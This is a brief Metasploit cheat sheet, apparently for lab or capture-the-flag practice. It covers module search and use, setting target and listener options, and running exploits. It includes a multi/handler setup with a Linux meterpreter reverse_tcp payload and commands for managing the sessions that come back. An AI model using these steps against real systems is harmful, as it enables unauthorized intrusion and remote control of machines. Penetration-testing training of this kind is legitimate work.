## Metasploit

Start Metasploit:

```bash
msfconsole -q
```

Useful commands inside Metasploit:

```text
search keyword
info
use module-name
show options
set RHOSTS TARGET
set RPORT PORT
set LHOST YOUR-TUN0-IP
set LPORT 4444
check
run
back
exit
```

### Generic listener with Metasploit

```text
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST YOUR-TUN0-IP
set LPORT 4444
run
```

Useful session commands:

```text
sessions -l
sessions -i 1
background
```

- `sessions -l` lists active sessions.
- `sessions -i 1` enters session number 1.
- `background` returns to Metasploit without closing a session.

Always read module information first:

```text
info
```

